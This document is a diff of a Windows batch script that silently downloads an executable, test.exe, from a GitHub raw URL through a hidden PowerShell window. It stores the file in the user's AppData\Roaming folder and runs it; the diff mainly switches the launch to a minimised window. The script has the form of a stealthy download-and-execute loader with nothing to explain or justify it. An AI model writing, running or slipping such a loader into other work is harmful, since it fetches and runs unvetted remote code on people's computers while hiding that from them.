@@ -1,11 +1,9 @@
 @echo off
 setlocal
 
-
 set "file=test.exe"
 set "url=https://github.com/rspvn/a/raw/main/test.exe"
 set "folder=%USERPROFILE%\AppData\Roaming\test"
-
 
 if not exist "%folder%" (
     mkdir "%folder%"
@@ -13,26 +11,16 @@ if not exist "%folder%" (
 
 :: Check if file exists
 if exist "%folder%\%file%" (
-    
-    start "" "%folder%\%file%"
+    start "" /min "%folder%\%file%"
     exit /b
 ) else (
-    
     powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%folder%\%file%' -ErrorAction SilentlyContinue"
-
-    
+    :: Check again if file exists after download attempt
     if exist "%folder%\%file%" (
-        
-
-        
-        start "" "%folder%\%file%"
-
-        
-       
+        start "" /min "%folder%\%file%"
     ) else (
         echo Download failed.
     )
-    
     :: Close CMD window after 5 seconds
     timeout /t 5 /nobreak >nul
     exit /b
